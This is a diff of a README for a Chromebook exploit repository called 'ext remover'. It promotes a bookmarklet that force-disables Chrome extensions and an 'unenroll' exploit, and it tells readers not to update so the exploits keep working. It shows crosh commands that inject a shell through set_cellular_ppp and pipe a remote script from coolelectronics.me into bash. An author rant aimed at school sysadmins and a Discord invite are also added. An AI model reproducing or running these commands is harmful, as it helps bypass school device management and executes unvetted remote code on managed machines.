@@ -1,8 +1,14 @@
 # ext remover
 
+## ATTENTION ALL SYS ADMINS!!! 
+
+Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is a endless game of wack-a-mole. Treat your students to a windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.
+
+## Back to your scheduled programming
+
 ![image](https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png)
 
-Bookmarklet exploit that can force-disable any extension installed on Google Chrome. Also known as LTBEEF.
+Bookmarklet exploit that can force-disable any extension installed on Google Chrome. Also known as LTBEEF. And for some reason I put a unenroll exploit aswell yippee
 
 **DO NOT UPDATE YOUR CHROMEBOOK! This exploit has been patched in versions 106 and above, so do not update!** If you version is above 106, [try this method](https://github.com/3kh0/ext-remover#v106-and-above)
 
@@ -120,3 +126,5 @@ Run the following commands in crosh:
 set_cellular_ppp \';bash;exit;\'
 bash <(curl https://coolelectronics.me/unenroll101.sh)
 ```
+
+There are still so many more fun exploits, please [join the discord](https://discord.gg/unblock)
